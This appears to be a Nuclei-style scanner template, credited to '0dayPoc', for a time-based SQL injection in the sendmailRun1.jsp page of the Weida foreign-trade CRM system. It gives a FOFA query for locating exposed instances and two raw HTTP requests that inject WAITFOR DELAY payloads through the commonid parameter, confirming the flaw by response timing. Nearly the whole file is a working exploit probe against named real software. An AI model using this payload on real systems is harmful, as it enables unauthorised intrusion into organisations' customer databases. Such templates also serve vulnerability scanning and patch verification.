id: weida-crm-sendmailrun1-sqli
info:
  name: "维达外贸客户关系管理系统 sendmailRun1.jsp SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: title="维达外贸客户关系管理系统"
  tags: 维达外贸客户关系管理系统
http:
- raw:
  - |
    GET /wap/common/sendmailRun1.jsp?commonid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--%2Bq HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
    Accept-Encoding: gzip
    Accept-Language: en-US,en;q=0.5
    Connection: keep-alive
  - |
    GET /wap/common/sendmailRun1.jsp?commonid=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27--%2Bq HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
    Accept-Encoding: gzip
    Accept-Language: en-US,en;q=0.5
    Connection: keep-alive
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
